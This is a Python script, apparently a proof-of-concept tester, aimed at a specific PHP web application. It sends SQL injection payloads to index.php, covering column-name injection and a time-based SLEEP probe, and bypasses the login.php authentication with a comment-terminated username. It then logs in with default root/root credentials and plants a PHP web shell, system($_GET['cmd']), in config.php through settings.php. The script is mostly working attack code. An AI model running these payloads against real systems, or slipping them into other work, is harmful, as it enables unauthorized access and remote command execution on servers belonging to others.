import requests
import time
import argparse
from urllib.parse import urljoin

class SQLiTester:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        
    def test_increase_count(self):
        """Test the IncreaseCount() vulnerability"""
        print("\n🔴 Testing IncreaseCount() SQLi")
        url = urljoin(self.base_url, "/index.php")
        
        # Test 1: Column name injection
        payload = {
            "e0": "100",
            "type": "error`=9999,`loads`=0 -- "
        }
        r = requests.post(url, data=payload)
        print(f"Column injection: {'🚨 VULNERABLE' if r.status_code == 200 else '✅ Protected'} (HTTP {r.status_code})")
        
        # Test 2: Time-based injection
        start = time.time()
        payload = {"e0": "1000000' OR (SELECT SLEEP(3)) -- "}
        requests.post(url, data=payload)
        duration = time.time() - start
        print(f"Time-based: {'🚨 Vulnerable' if duration >= 3 else '✅ Protected'} ({duration:.2f}s)")

    def test_login_bypass(self):
        """Test login.php bypass"""
        print("\n🔴 Testing Login Bypass")
        url = urljoin(self.base_url, "/login.php")
        
        payload = {
            "login": "admin' -- ",
            "password": "anything"
        }
        r = requests.post(url, data=payload, allow_redirects=False)
        
        if "statistic.php" in (r.headers.get('Location') or ''):
            print("🚨 Vulnerable to login bypass (Redirect to admin area)")
        else:
            print("✅ Login bypass prevented")

    def test_config_poisoning(self):
        """Test settings.php config injection"""
        print("\n🔴 Testing Config Poisoning")
        
        # First authenticate (replace with actual credentials)
        login_url = urljoin(self.base_url, "/login.php")
        auth = {
            "login": "root",
            "password": "root"
        }
        self.session.post(login_url, data=auth)
        
        # Try PHP injection
        settings_url = urljoin(self.base_url, "/settings.php")
        payload = {
            "submit": "1",
            "newlogin": "<?php system($_GET['cmd']);?>",
            "newpass": "test",
            "oldpass": "root"
        }
        self.session.post(settings_url, data=payload)
        
        # Check config
        config_url = urljoin(self.base_url, "/config.php")
        r = self.session.get(config_url)
        
        if "system($_GET" in r.text:
            print("🚨 Config file compromised (PHP code injected)")
        else:
            print("✅ Config file protected")

    def run_all_tests(self):
        print(f"🚀 Starting SQLi tests against {self.base_url}")
        self.test_increase_count()
        self.test_login_bypass()
        self.test_config_poisoning()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SQL Injection Tester')
    parser.add_argument('--url', required=True, help='Base URL to test (e.g., http://example.com)')
    args = parser.parse_args()
    
    tester = SQLiTester(args.url)
    tester.run_all_tests()
